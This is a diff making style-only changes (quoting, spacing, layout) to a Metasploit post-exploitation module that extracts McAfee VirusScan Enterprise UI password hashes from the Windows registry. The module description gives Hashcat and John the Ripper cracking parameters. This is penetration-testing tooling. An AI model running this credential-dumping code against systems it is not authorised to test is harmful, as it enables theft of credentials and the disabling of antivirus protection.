@@ -14,27 +14,29 @@ class MetasploitModule < Msf::Post
   VERSION_9 = Rex::Version.new('9.0')
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'          => 'McAfee Virus Scan Enterprise Password Hashes Dump',
-      'Description'   => %q(
-        This module extracts the password hash from McAfee Virus Scan Enterprise (VSE)
-        used to lock down the user interface. Hashcat supports cracking this type of
-        hash using hash type sha1($salt.unicode($pass)) (-m 140) and a hex salt
-        (--hex-salt) of 01000f000d003300 (unicode "\x01\x0f\x0d\x33"). A dynamic
-        format is available for John the Ripper at the referenced URL.
-      ),
-      'License'       => MSF_LICENSE,
-      'Author'        => [
-        'Mike Manzotti <mike.manzotti[at]dionach.com>', # Metasploit module
-        'Maurizio inode Agazzini' # original research
-      ],
-      'References'    => [
-        ['URL', 'https://www.dionach.com/blog/disabling-mcafee-on-access-scanning']
-      ],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'McAfee Virus Scan Enterprise Password Hashes Dump',
+        'Description' => %q{
+          This module extracts the password hash from McAfee Virus Scan Enterprise (VSE)
+          used to lock down the user interface. Hashcat supports cracking this type of
+          hash using hash type sha1($salt.unicode($pass)) (-m 140) and a hex salt
+          (--hex-salt) of 01000f000d003300 (unicode "\x01\x0f\x0d\x33"). A dynamic
+          format is available for John the Ripper at the referenced URL.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Mike Manzotti <mike.manzotti[at]dionach.com>', # Metasploit module
+          'Maurizio inode Agazzini' # original research
+        ],
+        'References' => [
+          ['URL', 'https://www.dionach.com/blog/disabling-mcafee-on-access-scanning']
+        ],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
   end
 
   def run
@@ -42,13 +44,13 @@ class MetasploitModule < Msf::Post
 
     vse_keys = enum_vse_keys
     if vse_keys.empty?
-      vprint_error("McAfee VSE not installed or insufficient permissions")
+      vprint_error('McAfee VSE not installed or insufficient permissions')
       return
     end
 
     hashes_and_versions = extract_hashes_and_versions(vse_keys)
     if hashes_and_versions.empty?
-      vprint_error("No McAfee VSE hashes extracted")
+      vprint_error('No McAfee VSE hashes extracted')
       return
     end
     process_hashes_and_versions(hashes_and_versions)
@@ -69,15 +71,15 @@ class MetasploitModule < Msf::Post
 
   def extract_hashes_and_versions(keys)
     vprint_status("Attempting to extract hashes from #{keys.size} McAfee VSE installations")
-    hash_map =  {}
+    hash_map = {}
     keys.each do |key|
-      hash = registry_getvaldata(key, "UIPEx")
+      hash = registry_getvaldata(key, 'UIPEx')
       if hash.empty?
         vprint_error("No McAfee VSE password hash found in #{key}")
         next
       end
 
-      version = registry_getvaldata(key, "szProductVer")
+      version = registry_getvaldata(key, 'szProductVer')
       if version.empty?
         vprint_error("No McAfee VSE version key found in #{key}")
         next
@@ -94,7 +96,7 @@ class MetasploitModule < Msf::Post
         version_name = 'v5'
       else
         # Base64 decode hash
-        hash =  Rex::Text.to_hex(Rex::Text.decode_base64(hash), "")
+        hash = Rex::Text.to_hex(Rex::Text.decode_base64(hash), '')
         hashtype = 'dynamic_1405'
         version_name = 'v8'
         unless version >= VERSION_8 && version < VERSION_9
